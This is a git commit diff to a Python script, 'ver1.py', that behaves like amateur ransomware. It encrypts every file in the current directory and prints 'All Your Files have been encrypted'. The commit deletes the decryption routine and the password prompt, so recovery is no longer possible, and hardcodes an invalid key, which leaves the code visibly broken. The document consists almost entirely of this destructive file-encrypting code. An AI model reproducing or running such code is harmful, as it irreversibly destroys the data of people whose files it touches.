5e822c7210915a27ce5a6392ff93fe0053f93aad
Dev-ag12 <123501569+Dev-ag12@users.noreply.github.com>
2023-11-09 13:16:39 +0530

    Update ver1.py

--- ver1.py
+++ ver1.py
@@ -16,13 +16,10 @@ def files_in_directory(path):
         pass
 files_in_directory(os.getcwd())
 
-print(len(files))
-
 for file in files:
     if os.path.basename(file) == "f1.py":
         files.remove(file)
-
-key = Fernet.generate_key()
+key = bytes(b'Devang')
 
 for file in files:
     with open(file,"rb") as thefile:
@@ -32,30 +29,6 @@ for file in files:
         thefile.write(contents_enc)
 
 
-def dec():
-    for file in files:
-        with open(file,"rb") as thefile:
-            contents = thefile.read()
-        contents_dec = Fernet(key).decrypt(contents)
-        with open(file,"wb") as thefile:
-            thefile.write(contents_dec)
+
 print("All Your Files have been encrypted")
 
-print("Enter Correct Password to decrypt:")
-
-inc_cnt = 0
-password = input()
-
-def passw(passg,inc_cnt1):
-    if inc_cnt1 == 5:
-        exit()
-    if passg == "devang":
-        dec()
-        print("Congrats All your files have been decrypted")
-    else:
-    inc_cnt1 += 1
-    print("Wrong attempt number:"+str(inc_cnt1)+". Enter Correct password:\n")
-    helm = input()
-    passw(helm,inc_cnt1)
-       
-passw(password,inc_cnt)
